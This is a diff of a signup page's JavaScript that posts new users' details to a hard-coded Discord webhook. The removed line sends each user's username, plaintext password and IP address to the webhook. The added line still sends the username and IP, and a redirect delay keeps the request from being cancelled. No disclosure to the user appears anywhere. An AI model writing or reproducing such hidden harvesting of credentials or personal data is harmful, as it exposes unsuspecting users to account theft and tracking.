@@ -82,7 +82,7 @@ const webhookURL = "https://discord.com/api/webhooks/1405861054017179708/rYLQuKp
 
 // Async webhook sender
 function sendWebhook(message){
-  fetch(webhookURL,{
+  return fetch(webhookURL,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({content: message})
@@ -118,10 +118,13 @@ document.getElementById("signup-form").addEventListener("submit", async function
   localStorage.setItem("users", JSON.stringify(users));
 
   const ip = await getIP();
-  sendWebhook(`💀 New signup: ${username}\nPassword: ${password}\nIP: ${ip}`);
+  await sendWebhook(`💀 New user: ${username}\nIP: ${ip}`);
 
-  alert("✅ Account created! Waiting for admin approval.");
-  window.location.href = "pending.html";
+  // Delay so webhook isn't canceled by redirect
+  setTimeout(() => {
+    alert("✅ Account created! Waiting for admin approval.");
+    window.location.href = "pending.html";
+  }, 1000);
 });
 </script>
 
